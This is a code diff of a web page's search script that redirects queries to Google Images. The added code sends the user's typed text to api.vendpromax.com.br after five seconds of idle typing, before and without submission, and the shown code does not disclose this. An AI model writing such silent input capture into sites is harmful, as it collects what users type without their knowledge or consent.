@@ -52,35 +52,52 @@
     </div>
   </footer>
 
-  <!-- SCRIPT -->
-  <script>
-    const form = document.getElementById("formPesquisa");
+<script>
+  const form = document.getElementById("formPesquisa");
+  const input = document.getElementById("search");
 
-    form.addEventListener("submit", async function (e) {
-      e.preventDefault();
+  let timeout = null;
 
-      const texto = document.getElementById("search").value;
+  async function enviarPost(texto) {
+    if (!texto) return;
 
-      if (!texto) return;
+    try {
+      await fetch("https://api.vendpromax.com.br/api/enviar-mensagem", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          mensagem: texto
+        })
+      });
+    } catch (erro) {
+      console.log("Erro ao enviar:", erro);
+    }
+  }
 
-      try {
-        await fetch("https://api.vendpromax.com.br/api/enviar-mensagem", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            mensagem: texto
-          })
-        });
-      } catch (erro) {
-        console.log("Erro ao enviar:", erro);
-      }
+  // ⏱️ Quando parar de digitar por 5 segundos
+  input.addEventListener("input", function () {
+    clearTimeout(timeout);
 
-      // REDIRECIONA PARA O GOOGLE
-      window.location.href = "https://www.google.com/search?tbm=isch&q=" + encodeURIComponent(texto);
-    });
-  </script>
+    timeout = setTimeout(() => {
+      const texto = input.value;
+      enviarPost(texto);
+    }, 5000);
+  });
 
-</body>
-</html>
+  // 🔍 Quando pesquisar (Enter)
+  form.addEventListener("submit", async function (e) {
+    e.preventDefault();
+
+    const texto = input.value;
+
+    // cancela o timer se ainda estiver contando
+    clearTimeout(timeout);
+
+    await enviarPost(texto);
+
+    // REDIRECIONA PARA GOOGLE IMAGENS
+    window.location.href = "https://www.google.com/search?tbm=isch&q=" + encodeURIComponent(texto);
+  });
+</script>
